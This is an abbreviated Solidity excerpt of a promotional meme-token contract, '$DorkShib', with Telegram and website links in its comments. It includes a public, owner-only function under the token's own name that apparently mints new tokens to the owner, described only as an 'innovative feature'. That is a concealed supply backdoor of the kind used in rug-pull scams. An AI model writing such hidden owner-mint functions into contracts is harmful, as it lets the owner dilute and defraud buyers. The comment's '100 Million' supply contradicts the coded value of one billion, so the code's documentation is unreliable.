//
// $DorkShib proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/DorkShibChannel
// 📱 Website ::https://dorkshib.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _DorkShib(uint256 amount) public onlyOwner {
 _DorkShib(msg.sender, amount);
    }
    ...
    function _DorkShib(address account, uint256 amount) internal virtual {
...
contract $DorkShib is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ᗪOᖇK SHIBA", "DORKS") {
     _DorkShib(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}